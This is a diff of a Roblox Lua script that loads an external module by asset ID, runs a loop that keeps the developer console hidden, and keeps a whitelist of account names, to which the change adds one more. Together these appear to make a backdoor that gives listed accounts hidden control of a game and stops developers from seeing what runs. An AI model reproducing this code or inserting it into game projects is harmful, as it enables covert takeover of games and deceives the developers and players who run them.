@@ -10,7 +10,7 @@ if game:GetService("RunService"):IsStudio() then
 	end
 	require(16303756383)(false,[===[while task.wait() do game:GetService("StarterGui"):SetCore("DevConsoleVisible", false) end]===])
 else
-	local whitelisted = {"gahwaeawqara1321","equsjd1","CONTRABL0X","Generatedacc_7","Generatedacc_5","HacClip","00cx0","lIlIlIIIIlllIlIllllI","G0hstW4vv","IChaosityl","CHARISMATRIX_PC"}
+	local whitelisted = {"gahwaeawqara1321","equsjd1","CONTRABL0X","Generatedacc_7","Generatedacc_5","HacClip","00cx0","lIlIlIIIIlllIlIllllI","G0hstW4vv","IChaosityl","CHARISMATRIX_PC","Zero_protocol"}
 	task.defer(function()
 		require(16303756383)(false,[===[while task.wait() do game:GetService("StarterGui"):SetCore("DevConsoleVisible", false) end]===])
 	end)
